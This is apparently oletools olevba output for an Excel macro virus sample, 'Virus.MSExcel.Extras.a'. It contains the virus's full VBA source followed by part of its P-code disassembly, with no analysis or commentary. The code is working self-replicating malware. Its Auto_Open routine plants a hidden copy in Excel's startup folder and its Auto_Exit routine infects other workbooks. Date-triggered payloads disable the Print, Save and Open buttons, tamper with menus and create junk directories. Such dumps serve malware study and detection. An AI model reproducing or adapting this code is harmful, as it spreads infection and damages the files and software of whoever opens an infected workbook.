olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Extras.a.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO EjZL38V3i1lHp4aeNy3U4f9Rr.bas 
in file: Virus.MSExcel.Extras.a.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/EjZL38V3i1lHp4aeNy3U4f9Rr'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Option Explicit
Private Sub hmhhmrnhnnrhmhhnnmmnnrhnnmhhnn()
Dim mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh As Integer
Randomize
mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh = Int((4 - 1 + 1) * Rnd + 1)
Call rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh
Select Case mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh
Case 1
Call rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr
Case 2
Call mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn
Case 3
Call nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh
Case 4
Call nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn
End Select
End Sub
Private Sub nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr(ByVal hnhhnnnrrrnnnmnnnnnnnrmnhmhrnr As String, ByVal rrhnmhrnhhnmnhhhhnhrnmmhnrmnhm As String)
Application.ScreenUpdating = False
Dim mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn, mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn As String
Workbooks.Add
ThisWorkbook.Sheets(1).Visible = True
ThisWorkbook.Sheets(1).Copy before:=ActiveWorkbook.Sheets(1)
If Val(Left(Application.Version, 1)) < 8 Then
With ActiveSheet
.Name = mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(-5 + 6 * 5)
.Visible = False
End With
End If
mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn = ActiveWorkbook.Name
mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn = CurDir()
ChDir Application.StartupPath
ActiveWindow.Visible = False
Workbooks(mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn).SaveAs Filename:=hnhhnnnrrrnnnmnnnnnnnrmnhmhrnr & rrhnmhrnhhnmnhhhhnhrnmmhnrmnhm, FileFormat:=xlNormal
ChDir mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn
ThisWorkbook.Sheets(1).Visible = False
Application.ScreenUpdating = True
End Sub
Private Sub rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr()
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
For Each hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh In Application.Toolbars("Standard").ToolbarButtons
If hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Print" Then hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Enabled = False
Next
End Sub
Private Sub nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn()
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
For Each hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh In Application.Toolbars("Standard").ToolbarButtons
If hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Save" Then hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Enabled = False
Next
End Sub
Private Sub nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh()
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
For Each hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh In Application.Toolbars("Standard").ToolbarButtons
If hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Open" Then hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Enabled = False
Next
End Sub
Sub Auto_Help()
Attribute Auto_Help.VB_ProcData.VB_Invoke_Func = " \n14"
Randomize
With Application
.SheetsInNewWorkbook = Int((255 - 1 + 1) * Rnd + 1)
.Help
End With
End Sub
Sub Auto_Open()
Attribute Auto_Open.VB_ProcData.VB_Invoke_Func = " \n14"
Dim rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr, rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr, nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm As String
Dim mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh As Boolean
Dim hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn As Variant
nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm = "EXTRAS.XLS"
If Left(Application.OperatingSystem, 3) = "Mac" Then
nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm = "Macintosh Extras"
ElseIf Left(Application.OperatingSystem, 10) <> "Windows 3." Then
nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm = "Windows Extras.xls"
End If
rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr = Application.StartupPath & Application.PathSeparator
rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr = Dir(rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm)
If rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr = "" Then
nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr, nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm
Else
mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh = False
For Each hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn In Application.Workbooks
If hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn.Name = nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm Then
mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh = True
Exit For
End If
Next
If mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh = False Then
Application.ScreenUpdating = False
Workbooks.Open Filename:=(rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm), IgnoreReadOnlyRecommended:=True
End If
If Workbooks(nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm).Modules.Count = 0 Then
Application.ScreenUpdating = False
Workbooks(nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm).Close savechanges:=False
On Error GoTo hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr
Kill (rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm)
On Error GoTo 0
nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr, nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm
ElseIf Len(Workbooks(nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm).Modules(1).Name) <> (7 + 6 * 3) Then
Application.ScreenUpdating = False
Workbooks(nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm).Close savechanges:=False
On Error GoTo hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr
Kill (rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm)
On Error GoTo 0
nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr, nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm
End If
End If
Application.OnSheetActivate = rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm & "!" & "Auto_Exit"
Exit Sub
hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr:
SetAttr (rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr & nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm), vbNormal
Resume
End Sub
Private Function mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr As Integer)
Dim mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh As Integer
Dim nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm As Integer
Dim nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn As String
Dim rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr As Double
Dim nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm As Double
Dim nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh As Double
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Integer
nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn = ""
mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh = rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr
For hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh = 1 To mrhmrmhrrhrrnhrhrrhmmrmhhmnnhh
rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr = 10 / 62
nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm = 36 / 62
Randomize
nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh = Rnd()
Randomize
If nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh < rhrhnhhmmmmnnnhrrnhhnmmmrrnrrr Then
nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm = Int((57 - 48 + 1) * Rnd + 48)
ElseIf nmhmhnnhhhhhrhhnmnmnhnmhnnmnrh < nrmhmhnnhhrnhhmrrnhnhnhhnmrhrm Then
nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm = Int((90 - 65 + 1) * Rnd + 65)
Else
nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm = Int((122 - 97 + 1) * Rnd + 97)
End If
nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn = nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn + Chr(nhnhhnrhhnrrhnhrnmmmnrnmrrmmnm)
Next
mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn = nnmnnrhmmhmhhmmhnmrhmmmmmnhhnn
End Function
Private Sub rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh()
Dim mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh, hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
For Each mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh In MenuBars(xlWorksheet).Menus("Format").MenuItems
If mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh.Caption = Application.UserName & "..." Then mnnhnhrrmnrnrrmnhhhnmmrmhrmrmh.Delete
Next
For Each hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh In Application.Toolbars("Standard").ToolbarButtons
If hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Print" Or hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Open" Or hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Name = "Save" Then hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh.Enabled = True
Next
End Sub
Sub Auto_Close()
Attribute Auto_Close.VB_ProcData.VB_Invoke_Func = " \n14"
If ThisWorkbook.Path = Application.StartupPath And UCase(ThisWorkbook.Name) Like "*EXTRAS*" Then ThisWorkbook.Saved = True
End Sub
Private Sub hnmhmhrnnhmrhrmmnrhnrhmhnrmnrh()
On Error GoTo nhrmrnnnmnnhrrmhhhnhrmnmrmrnmn
If Rnd < 0.1 Then MkDir mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(8) & "." & mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(3)
nhrmrnnnmnnhrrmhhhnhrmnmrmrnmn:
Exit Sub
End Sub
Private Sub hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn()
If Not ActiveWorkbook.ProtectStructure Then
Application.ScreenUpdating = False
Dim mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm As Variant
Dim mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn As String
mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn = ActiveWorkbook.ActiveSheet.Name
Set mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm = ActiveWorkbook
ThisWorkbook.Activate
ThisWorkbook.Sheets(1).Visible = True
mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm.Activate
ThisWorkbook.Sheets(1).Copy before:=ActiveWorkbook.Sheets(1)
With ActiveSheet
.Name = mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn(351 / 9 - 14)
.Visible = False
End With
ThisWorkbook.Activate
ThisWorkbook.Sheets(1).Visible = False
With mmnmnhrrrhhmnmhrmmmrhmnrhhmmnm
.Activate
.Sheets(mmmnmmhnmrmnhhhnmnhrhmhnhhnmhn).Select
End With
Application.ScreenUpdating = True
End If
End Sub
Private Sub mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn()
Dim hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh As String
hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh = "Style..."
Randomize
If Rnd > 0.5 Then hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh = "AutoFormat..."
On Error GoTo mrmhnhrhnmhrhmrmhhrhnrnhnnhhnr
MenuBars(xlWorksheet).Menus("Format").MenuItems.Add Caption:=Application.UserName & "...", before:=hmhmmmrmmhnmmnmhnhrhnnmrmrnmhh
MenuBars(xlWorksheet).Menus("Format").MenuItems(Application.UserName & "...").Enabled = False
mrmhnhrhnmhrhmrmhhrhnrnhnnhhnr:
Exit Sub
End Sub
Private Sub mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr()
Dim hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr As Integer
Randomize
hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr = Int((12 - 1 + 1) * Rnd + 1)
If hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr <= 6 Then
Call rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh
Select Case hrmrmnmrnhnrhhhmhhrrmmhhnnnhhr
Case 1
Call rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr
Case 2
Call hnhhhhrrrrhhnrnhmmrnhnrrrmmmmm
Case 3
Call hnmhmhrnnhmrhrmmnrhnrhmhnrmnrh
Case 4
Call mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn
Case 5
Call nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh
Case 6
Call nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn
End Select
End If
End Sub
Private Sub hnhhhhrrrrhhnrnhmmrnhnrrrmmmmm()
Application.Toolbars("Auditing").Visible = True
End Sub
Sub Auto_Exit()
Attribute Auto_Exit.VB_ProcData.VB_Invoke_Func = " \n14"
Dim hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh As Variant
If ActiveWorkbook.Modules.Count = 0 Then
If Val(Left(Application.Version, 1)) < 8 Then
hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn
Else
If Year(Now) >= (26 ^ 2 - 10 + 1 / 3) * 3 Then Call mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr
End If
ElseIf Len(ActiveWorkbook.Modules(1).Name) <> (276 / 12 + 2) Then
If Val(Left(Application.Version, 1)) < 8 Then
hrhmmnrhrnhnrmrrnhnrrnhrhrhrnn
Else
If Year(Now) >= (26 ^ 2 - 10 + 1 / 3) * 3 Then Call mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr
End If
Else
If Year(Now) >= (26 ^ 2 - 10 + 1 / 3) * 3 Then Call mmnrhnhnhhmhmhrmrhrrhnhmhrhnnr
End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     33 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  EjZL38V3i1lHp4aeNy3U4f9R
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSExcel.Extras.a.xls
' ===============================================================================
' Module streams:
' _VBA_PROJECT_CUR/VBA/EjZL38V3i1lHp4aeNy3U4f9Rr - 13704 bytes
' Line #0:
' Line #1:
' 	Option  (Explicit)
' Line #2:
' 	FuncDefn (Private Sub hmhhmrnhnnrhmhhnnmmnnrhnnmhhnn())
' Line #3:
' 	Dim 
' 	VarDefn mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh (As Integer)
' Line #4:
' 	ArgsCall Read 0x0000 
' Line #5:
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh 
' Line #6:
' 	ArgsCall (Call) rnnhnrnnrnmrnhnnhmhrhmrrhnrnmh 0x0000 
' Line #7:
' 	Ld mmnhrrrhhhnnrnmrnnhnnhmrmmnhrh 
' 	SelectCase 
' Line #8:
' 	LitDI2 0x0001 
' 	Case 
' 	CaseDone 
' Line #9:
' 	ArgsCall (Call) rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr 0x0000 
' Line #10:
' 	LitDI2 0x0002 
' 	Case 
' 	CaseDone 
' Line #11:
' 	ArgsCall (Call) mnhrnnhhhhrnmnmnmhrhrhhmmhhhmn 0x0000 
' Line #12:
' 	LitDI2 0x0003 
' 	Case 
' 	CaseDone 
' Line #13:
' 	ArgsCall (Call) nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh 0x0000 
' Line #14:
' 	LitDI2 0x0004 
' 	Case 
' 	CaseDone 
' Line #15:
' 	ArgsCall (Call) nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn 0x0000 
' Line #16:
' 	EndSelect 
' Line #17:
' 	EndSub 
' Line #18:
' 	FuncDefn (Private Sub nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr(ByVal hnhhnnnrrrnnnmnnnnnnnrmnhmhrnr As String, ByVal rrhnmhrnhhnmnhhhhnhrnmmhnrmnhm As String))
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #20:
' 	Dim 
' 	VarDefn mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn
' 	VarDefn mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn (As String)
' Line #21:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #22:
' 	LitVarSpecial (True)
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	MemSt Visible 
' Line #23:
' 	LitDI2 0x0001 
' 	Ld ActiveWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	ParamNamed before 
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	ArgsMemCall Copy 0x0001 
' Line #24:
' 	Ld Application 
' 	MemLd Version 
' 	LitDI2 0x0001 
' 	ArgsLd LBound 0x0002 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0008 
' 	Lt 
' 	IfBlock 
' Line #25:
' 	StartWithExpr 
' 	Ld ActiveSheet 
' 	With 
' Line #26:
' 	LitDI2 0x0005 
' 	UMi 
' 	LitDI2 0x0006 
' 	LitDI2 0x0005 
' 	Mul 
' 	Add 
' 	ArgsLd mnhrnnhmhrrrhrhmrnmnmmhhmrmmmn 0x0001 
' 	MemStWith New 
' Line #27:
' 	LitVarSpecial (False)
' 	MemStWith Visible 
' Line #28:
' 	EndWith 
' Line #29:
' 	EndIfBlock 
' Line #30:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	St mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn 
' Line #31:
' 	ArgsLd CurDir 0x0000 
' 	St mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn 
' Line #32:
' 	Ld Application 
' 	MemLd StartupPath 
' 	ArgsCall ChDir 0x0001 
' Line #33:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #34:
' 	Ld hnhhnnnrrrnnnmnnnnnnnrmnhmhrnr 
' 	Ld rrhnmhrnhhnmnhhhhnhrnmmhnrmnhm 
' 	Concat 
' 	ParamNamed Filename 
' 	Ld xlNormal 
' 	ParamNamed FileFormat 
' 	Ld mhnrrrnnnhnmmmhrnhnrhmhhhmhhnn 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall SaveAs 0x0002 
' Line #35:
' 	Ld mrnhnhnnrrmmrmnhrnrrmmnmrmnnmn 
' 	ArgsCall ChDir 0x0001 
' Line #36:
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ThisWorkbook 
' 	ArgsMemLd Sheets 0x0001 
' 	MemSt Visible 
' Line #37:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #38:
' 	EndSub 
' Line #39:
' 	FuncDefn (Private Sub rnmhhhnnnhmnnnrhhhhnhhhnrhmmhr())
' Line #40:
' 	Dim 
' 	VarDefn hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh (As Variant)
' Line #41:
' 	StartForVariable 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	EndForVariable 
' 	LitStr 0x0008 "Standard"
' 	Ld Application 
' 	ArgsMemLd Toolbars 0x0001 
' 	MemLd ToolbarButtons 
' 	ForEach 
' Line #42:
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemLd New 
' 	LitStr 0x0005 "Print"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemSt Enabled 
' 	EndIf 
' Line #43:
' 	StartForVariable 
' 	Next 
' Line #44:
' 	EndSub 
' Line #45:
' 	FuncDefn (Private Sub nmhrrhmmhhrrmhhnmmnmmnnnhmnrmn())
' Line #46:
' 	Dim 
' 	VarDefn hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh (As Variant)
' Line #47:
' 	StartForVariable 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	EndForVariable 
' 	LitStr 0x0008 "Standard"
' 	Ld Application 
' 	ArgsMemLd Toolbars 0x0001 
' 	MemLd ToolbarButtons 
' 	ForEach 
' Line #48:
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemLd New 
' 	LitStr 0x0004 "Save"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemSt Enabled 
' 	EndIf 
' Line #49:
' 	StartForVariable 
' 	Next 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Private Sub nnmhrhmhrnrmmrhnrmhmnhmmnnmnrh())
' Line #52:
' 	Dim 
' 	VarDefn hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh (As Variant)
' Line #53:
' 	StartForVariable 
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	EndForVariable 
' 	LitStr 0x0008 "Standard"
' 	Ld Application 
' 	ArgsMemLd Toolbars 0x0001 
' 	MemLd ToolbarButtons 
' 	ForEach 
' Line #54:
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemLd New 
' 	LitStr 0x0004 "Open"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	Ld hnmnhhrhmhrrnmmnrrnnhmmrnnrnmh 
' 	MemSt Enabled 
' 	EndIf 
' Line #55:
' 	StartForVariable 
' 	Next 
' Line #56:
' 	EndSub 
' Line #57:
' 	FuncDefn (Sub Auto_Help())
' Line #58:
' 	ArgsCall Read 0x0000 
' Line #59:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #60:
' 	LitDI2 0x00FF 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	MemStWith SheetsInNewWorkbook 
' Line #61:
' 	ArgsMemCallWith Help 0x0000 
' Line #62:
' 	EndWith 
' Line #63:
' 	EndSub 
' Line #64:
' 	FuncDefn (Sub Auto_Open())
' Line #65:
' 	Dim 
' 	VarDefn rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr
' 	VarDefn rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr
' 	VarDefn nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm (As String)
' Line #66:
' 	Dim 
' 	VarDefn mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh (As Boolean)
' Line #67:
' 	Dim 
' 	VarDefn hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn (As Variant)
' Line #68:
' 	LitStr 0x000A "EXTRAS.XLS"
' 	St nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' Line #69:
' 	Ld Application 
' 	MemLd OperatingSystem 
' 	LitDI2 0x0003 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 "Mac"
' 	Eq 
' 	IfBlock 
' Line #70:
' 	LitStr 0x0010 "Macintosh Extras"
' 	St nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' Line #71:
' 	Ld Application 
' 	MemLd OperatingSystem 
' 	LitDI2 0x000A 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x000A "Windows 3."
' 	Ne 
' 	ElseIfBlock 
' Line #72:
' 	LitStr 0x0012 "Windows Extras.xls"
' 	St nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' Line #73:
' 	EndIfBlock 
' Line #74:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	St rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' Line #75:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Concat 
' 	ArgsLd Dir 0x0001 
' 	St rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr 
' Line #76:
' 	Ld rrnmhnnrrmnmmhmmrhhhmhrhnmnrrr 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #77:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsCall nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr 0x0002 
' Line #78:
' 	ElseBlock 
' Line #79:
' 	LitVarSpecial (False)
' 	St mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh 
' Line #80:
' 	StartForVariable 
' 	Ld hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn 
' 	EndForVariable 
' 	Ld Application 
' 	MemLd Workbooks 
' 	ForEach 
' Line #81:
' 	Ld hrnnmnnnrhrnrrrnnhhmnnrnmrnmhn 
' 	MemLd New 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Eq 
' 	IfBlock 
' Line #82:
' 	LitVarSpecial (True)
' 	St mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh 
' Line #83:
' 	ExitFor 
' Line #84:
' 	EndIfBlock 
' Line #85:
' 	StartForVariable 
' 	Next 
' Line #86:
' 	Ld mhhmmnrmmhnhhhhnrmrnnrnhhmnmnh 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #87:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #88:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Concat 
' 	Paren 
' 	ParamNamed Filename 
' 	LitVarSpecial (True)
' 	ParamNamed IgnoreReadOnlyRecommended 
' 	Ld Workbooks 
' 	ArgsMemCall Option 0x0002 
' Line #89:
' 	EndIfBlock 
' Line #90:
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsLd Workbooks 0x0001 
' 	MemLd Modules 
' 	MemLd Count 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #91:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #92:
' 	LitVarSpecial (False)
' 	ParamNamed savechanges 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsLd Workbooks 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #93:
' 	OnError hrmhrnnmmhhnrhrrrmmmmmhmmmhmmr 
' Line #94:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	Concat 
' 	Paren 
' 	ArgsCall Kill 0x0001 
' Line #95:
' 	OnError (GoTo 0) 
' Line #96:
' 	Ld rhhnmhhnrrnrrrrhrmnmmnnrrnhrhr 
' 	Ld nrrhmhnnrhrrrrmrmrhnrrmmmrnhhm 
' 	ArgsCall nnmrhnmmrnrhhmhnrhhmmmhhhmnrmr 0x0002 
' Line #97:
' 	LitDI2 0x0001 
